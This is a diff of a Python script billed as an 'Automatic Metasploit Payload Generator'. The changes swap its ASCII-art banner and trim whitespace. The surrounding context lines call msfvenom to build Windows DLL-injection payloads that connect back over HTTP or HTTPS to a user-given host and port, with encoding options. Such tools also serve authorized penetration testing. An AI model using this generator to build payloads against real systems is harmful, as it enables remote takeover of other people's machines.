@@ -12,14 +12,18 @@ GR = '\033[37m'  # gray
 
 
 while (True):
-    print C + "   _____                                      _____       _           _    "
-    print "  / ____|                                    |  __ \     | |         | |   "
-    print "  | (___  _   _ _ __  _ __ ___ _ __ ___   ___| |__) |___ | |__   ___ | |_  "
-    print "  \___ \|| | | |  _ \| '__/ _ \ '_ ` _ \ / _ \  _  // _ \| '_ \ / _ \| __| "
-    print "   ____) | |_| | |_) | | |  __/ | | | | |  __/ | \ \ (_) | |_) | (_) | |_  "
-    print "  |_____/ \__,_| .__/|_|  \___|_| |_| |_|\___|_|  \_\___/|_.__/ \___/ \__| "
-    print "               | |                                                         "
-    print "               |_|                                                         " + W
+
+    print C + "______     ______           _                 _ "
+    print "| ___ \    | ___ \         | |               | |"
+    print "| |_/ /   _| |_/ /_ _ _   _| | ___   __ _  __| |"
+    print "|  __/ | | |  __/ _` | | | | |/ _ \ / _` |/ _` |"
+    print "| |  | |_| | | | (_| | |_| | | (_) | (_| | (_| |"
+    print "\_|   \__, \_|  \__,_|\__, |_|\___/ \__,_|\__,_|"
+    print "       __/ |           __/ |                    "
+    print "      |___/           |___/                     " + W 
+
+
+
     print G + "[*] Automatic Metasploit Payload Generator [*]" + P
     print "[*] Written By: ex0dus_0x [*]" + W
     print "     "
@@ -122,7 +126,7 @@ while (True):
         with open("{}.{}".format(payname, formatop), 'w') as outfile:
             call(["msfvenom", "-p", "windows/dllinject/reverse_http", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
     elif payop == "16":
-        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W 
+        print G + "Additional option required: " + W + " Specify path to " + O + "reflective dll script." + W
         dllpath = raw_input("[>] ")
         with open("{}.{}".format(payname, formatop), 'w') as outfile:
             call(["msfvenom", "-p", "windows/dllinject/reverse_https", "LHOST={}".format(lhost), "LPORT={}".format(lport), "DLL={}".format(dllpath), "-e", str(encode), "-i", str(iteration), "-f", str(formatop)], stdout=outfile)
